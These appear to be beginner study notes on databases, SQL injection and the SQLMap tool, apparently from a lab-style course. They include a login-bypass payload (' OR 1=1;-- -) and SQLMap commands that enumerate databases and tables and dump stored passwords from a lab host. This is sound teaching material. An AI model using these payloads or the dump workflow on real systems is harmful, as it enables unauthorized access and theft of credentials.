# SQL Injection Basics (Simple Notes)

## 1. What is a Database?
- A **database** is like a digital cupboard where information is stored in an organized way.  
- It allows us to **store**, **modify**, and **retrieve** data easily.

### Example:
Imagine a cupboard with multiple drawers:
- Drawer 1 → Usernames
- Drawer 2 → Passwords
- Drawer 3 → Orders  
Whenever you need information, you just open the right drawer and pick the data.



## 2. How Websites Use Databases
- Websites use databases to save and fetch data.  
- Whenever you log in, search for something, or fill a form, the website interacts with the database.

### Example: Login Page
1. You type your **username** and **password**.
2. Website checks inside the database:
   - Does this username exist?
   - Is the password correct?
3. If yes → You log in.  
   If no → Access denied.



## 3. How Data Is Fetched (Search Example)
- Suppose you go to an **online bookshop** website.  
- You type: `Harry Potter` in the search box.  
- Website asks its database:  
  → "Hey database, do you have a book called *Harry Potter*?"  
- Database finds it and sends the result back.  
- Website then shows it to you.



## 4. Who Manages Databases?
- Databases are controlled by **DBMS (Database Management Systems)**.  
- Some popular DBMS are:
  - MySQL
  - PostgreSQL
  - SQLite
  - Microsoft SQL Server



## 5. How Websites Talk to Databases
- Websites use a language called **SQL (Structured Query Language)**.  
- SQL helps to ask the database questions like:
  - "Find this record"
  - "Add this data"
  - "Update this detail"
  - "Delete this entry"

### Example Queries
- Login check:
  ```sql
  SELECT * FROM users WHERE username = 'somya' AND password = '1234';
  ```
- Search for a book:
```
SELECT * FROM books WHERE title = 'Harry Potter';
```
## ✅ Summary
- A Database = Organized storage of data.
- A Website = Talks to database whenever it needs info (login, search, etc.).
- DBMS = Software that manages databases (MySQL, etc.).
- SQL = Language websites use to talk to the database.

---

# SQL Injection (Explained Simply)

## 1. Normal Login Query
When you log in to a website, it usually sends your details to the database.  
For example:

- Username entered → `John`  
- Password entered → `Un@detectable444`

The website will make a query like this:

```sql
SELECT * FROM users 
WHERE username = 'John' AND password = 'Un@detectable444';
```

**Explanation:**
- username = 'John' → Database checks if there is a user named John.
- password = 'Un@detectable444' → Database checks if password matches.
- Both must be true because of AND.
- If both match → Login successful ✅
- If not → Login fails ❌
## 2. Problem: No Input Validation
If the website does not sanitize input (means it does not carefully check what user typed),
then the attacker can inject malicious SQL code.
## 3. Attacker’s Trick
The attacker does not know John’s real password.

So instead of the real password, they type:
- Username: John
- Password: abc' OR 1=1;-- -
Now the website will create this query:
```
SELECT * FROM users 
WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```
## 4. Why Does This Work?
Let’s break it down:
- username = 'John' → True (John exists in DB).
- password = 'abc' → False (wrong password).
- OR 1=1 → Always True (1 is always equal to 1).
- Because of the OR, the whole condition becomes True ✅
- -- - → This makes the rest of the query a comment, so DB ignores it.
**So final effect:**
- Query becomes True.
- Database thinks the attacker is John.
- Attacker logs in without knowing password 🚨
## 5. Important Detail: The Single Quote (')
Notice how the attacker wrote password as:
```
abc' OR 1=1;-- -
```
- abc → Just a random text.
- ' → Ends the password string in SQL.
- OR 1=1 → Injected logic (always true).
- -- - → Comments out rest of the query.
If attacker did not use ',
the input would be treated as a normal password string, not as part of the SQL query.
## ✅ Summary
- Websites use SQL queries to check username & password.
- If inputs are not validated, attackers can inject SQL code.
- Example attack: ' OR 1=1;-- -
- This makes login bypass possible without knowing real password.
- This is called SQL Injection (SQLi). 🚨
---
# SQLMap (Automated SQL Injection Tool)

## 1. What is SQLMap?
- **SQLMap** is a tool that helps you **find and exploit SQL injection vulnerabilities** automatically.  
- Instead of manually typing long SQL payloads, you can let SQLMap do the heavy lifting.  
- It is used from the **terminal/command line**.  



## 2. Basic Usage
- To check all options of SQLMap:
```
sqlmap --help
```
- For beginners, use the wizard mode:
sqlmap --wizard
👉 This will guide you step by step and ask questions.



## 3. Example: Testing a Vulnerable URL
Suppose the target website has this URL:
http://sqlmaptesting.thm/search?cat=1
Here, the parameter `cat=1` might be vulnerable.

Run SQLMap with:
```
sqlmap -u http://sqlmaptesting.thm/search?cat=1
```
### What SQLMap Does:
- Tests the URL for SQL injection.  
- Shows if the parameter (`cat`) is vulnerable.  
- Identifies the **type of SQL injection** (boolean-based, error-based, time-based, UNION).  



## 4. Extracting Database Names
Once vulnerability is confirmed, get all databases with:
```
sqlmap -u http://sqlmaptesting.thm/search?cat=1 --dbs
```
**Example Result:**
[] users
[] members



## 5. Extracting Tables
Now, let’s check tables inside the `users` database:
```
sqlmap -u http://sqlmaptesting.thm/search?cat=1 -D users --tables
```
**Example Result:**
+-----------+
| johnath |
| alexas |
| thomas |
+-----------+



## 6. Extracting Records from a Table
Suppose we want data from the `thomas` table inside the `users` database:
```
sqlmap -u http://sqlmaptesting.thm/search?cat=1 -D users -T thomas --dump
```
**Example Result:**
+---------------------+------------+---------+
| Date | name | pass |
+---------------------+------------+---------+
| 09/09/2024 | Thomas THM | testing |
+---------------------+------------+---------+

👉 Here we can see the username and password stored in the table.



## 7. POST-Based Testing
Sometimes websites send data via **POST requests** (e.g., login forms), not in the URL.  
To test this:
1. Intercept the request (e.g., with Burp Suite).
2. Save it into a file like `intercepted_request.txt`.
3. Run SQLMap with:
```
sqlmap -r intercepted_request.txt

```

# ✅ Summary
- **SQLMap** = Automated SQL Injection tool.  
- **Basic workflow**:
  1. Test URL for vulnerability (`-u`).  
  2. Extract database names (`--dbs`).  
  3. Extract tables (`-D dbname --tables`).  
  4. Dump data from a table (`-D dbname -T tablename --dump`).  
- Works with both **GET URLs** and **POST requests**.  

